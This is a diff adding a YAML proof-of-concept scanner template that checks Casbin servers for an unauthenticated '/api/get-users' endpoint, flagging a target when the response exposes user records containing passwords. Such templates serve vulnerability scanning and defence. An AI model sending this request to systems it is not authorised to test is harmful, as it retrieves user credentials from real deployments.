@@ -1,0 +1,16 @@
+name: poc-yaml-casbin_get_users
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/get-users?p=123&pageSize=123
+      follow_redirects: false
+    expression: >-
+      response.status == 200 && response.body_string.contains("password") &&
+      response.body_string.contains("user")
+expression: r0()
+detail:
+  author: ''
+  links:
+    - https://blog.csdn.net/weixin_46801402/article/details/127646586
